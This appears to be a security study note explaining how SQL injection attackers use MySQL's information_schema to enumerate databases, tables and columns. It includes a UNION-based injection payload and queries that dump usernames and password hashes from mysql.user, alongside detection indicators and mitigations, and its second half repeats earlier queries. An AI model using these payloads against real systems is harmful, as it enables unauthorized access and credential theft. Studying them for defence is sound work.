# Using **information_schema** for SQL Injection

`information_schema` is a built-in metadata schema (in MySQL and many RDBMS equivalents) that exposes database structure — database names, table names, column names, types, etc. Attackers leverage it during SQLi to discover the organization of the DB before extracting actual data.

---

## Enumerating Databases

**Purpose:** list all database (schema) names so attacker knows where interesting data may reside.

Example queries shown in the screenshot:

```mathematica
SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;

SELECT GROUP_CONCAT(TABLE_SCHEMA) FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;

```

**What they do**

- The first returns each database name as separate rows.
- The second aggregates database names into a single comma-separated result (convenient for exfiltration).

**How attackers use this**

- Run via in-band SQLi (if results are returned) or use blind/time-based techniques to extract names one character at a time.
- Then target specific schemas (e.g., `app_db`, `users_db`) for deeper enumeration.

---

## Enumerating Tables

**Purpose:** list table names inside a target database to find tables that likely contain sensitive data (users, credentials, orders).

Example:

```
SELECT TABLE_NAME
  FROM information_schema.TABLES
  WHERE TABLE_SCHEMA = 'mysql';

SELECT GROUP_CONCAT(TABLE_NAME)
  FROM information_schema.TABLES
  WHERE TABLE_SCHEMA = 'mysql';

```

**What they do**

- First returns table names from the `mysql` schema one per row.
- Second returns all names concatenated into a single row.

**How attackers use this**

- Identify table names such as `users`, `credentials`, `transactions` then craft further queries to extract rows or columns.

---

## Enumerating Columns

**Purpose:** discover column names inside a table so attackers know which columns to target for data (email, password_hash, ssn).

Example:

```
SELECT COLUMN_NAME
  FROM information_schema.COLUMNS
  WHERE TABLE_SCHEMA = 'mysql'
    AND TABLE_NAME  = 'user';

SELECT GROUP_CONCAT(COLUMN_NAME)
  FROM information_schema.COLUMNS
  WHERE TABLE_SCHEMA = 'mysql'
    AND TABLE_NAME  = 'user';

```

**What they do**

- List column names for the specified table; `GROUP_CONCAT` returns them together.

**How attackers use this**

- Learn exact column names (e.g., `username`, `password`, `email`) to craft SELECTs like `SELECT password FROM users WHERE id=...` or to build UNION payloads.

---

## Variations & Notes

- Different DBMS have different metadata views: e.g., PostgreSQL uses `pg_catalog` / `information_schema`, MSSQL has `INFORMATION_SCHEMA.TABLES` and system views like `sys.tables`.
- When direct output is not available, attackers use blind or time-based methods to extract metadata character by character.
- `GROUP_CONCAT` (or DB equivalent) is frequently used to pack many names into one response, reducing the number of requests.

---

## Detection Indicators

- Unusual queries to `information_schema` / metadata tables in DB logs.
- Responses containing many comma-separated schema/table/column names where normally there would be none.
- Repeated automated requests that iterate over schema/table/column names (patterned probes).
- Increased use of `GROUP_CONCAT`, `UNION`, or long SELECTs in application logs.

---

## Practical Mitigations (how to reduce risk)

1. **Parameterized queries / prepared statements** — primary defense; never concatenate user input into SQL.
2. **Least privilege** — application DB accounts should only have the permissions they need. Ideally they should **not** have rights to access other schemas or view metadata beyond necessary scope.
3. **Restrict access to metadata where possible** — limit which accounts can query `information_schema` or equivalent (apply DB role privileges).
4. **Network & feature hardening** — remove unnecessary DB users, disable or limit powerful features, and ensure DB consoles aren’t publicly exposed.
5. **Hide detailed errors** — do not return DB errors or metadata to end users.
6. **Egress / monitoring** — monitor DB activity for queries to metadata tables and alert on abnormal patterns.
7. **WAF & rate limiting** — use as defense-in-depth to slow or block automated enumeration.
8. **Regular code review & testing**
9.  — SAST/DAST and manual pen tests focusing on SQLi and metadata enumeration paths.

### Extracting User Data

With knowledge of columns, attackers can extract user credentials:

```sql
SELECT User, authentication_string FROM mysql.user;

```

```sql
SELECT GROUP_CONCAT(User), GROUP_CONCAT(authentication_string) FROM mysql.user;

```

- These reveal all users and their password hashes (or authentication strings).

---

### Example: SQL Injection via Union and information_schema

A practical SQLi payload to list users and hashes using `UNION ALL`:

```sql
?id=1' UNION ALL SELECT GROUP_CONCAT(User), GROUP_CONCAT(authentication_string), 3, 4, 5 FROM mysql.user--

```

- The specific number of columns (here “3, 4, 5”) must match the original query’s column count in the vulnerable application.

# Getting Database, Table, and Column Names

**Enumerate All Database Names:**

```sql
SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
SELECT group_concat(TABLE_SCHEMA) FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;

```

- These queries list all databases known to the server.

**Find All Tables in a Database:**

```sql
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';
SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';

```

- Targets only the specified database, e.g., `mysql`.

**Find All Columns in a Table:**

```sql
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mysql' AND TABLE_NAME='user';
SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mysql' AND TABLE_NAME='user';

```

- Reveals available fields in a sensitive table such as `user`.

---

# Extracting Sensitive Data

**Extract Usernames and Hashes:**

```sql
SELECT User, authentication_string FROM mysql.user;
SELECT group_concat(User), group_concat(authentication_string) FROM mysql.user;

```

- Provides all users and password hashes (or authentication strings) in MySQL’s `user` table.
